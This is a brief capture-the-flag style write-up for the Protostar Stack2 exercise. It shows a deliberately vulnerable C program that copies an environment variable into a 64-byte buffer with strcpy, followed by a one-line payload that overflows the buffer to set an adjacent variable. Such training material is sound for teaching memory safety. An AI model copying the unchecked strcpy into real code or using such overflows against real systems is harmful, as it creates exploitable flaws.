# Protostar :: Stack2

Here is the code for this exercise.
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

This exercise is identical to the previous exercise, only now we're
writing our payload into an environment variable to solve it. Take a look at
the stack0 writeup to learn how to do it.
```bash
$ export GREENIE=$(python -c 'print "A" * 64 + "\x0a\x0d\x0a\x0d"')
$ ./stack2
you have correctly modified the variable
```
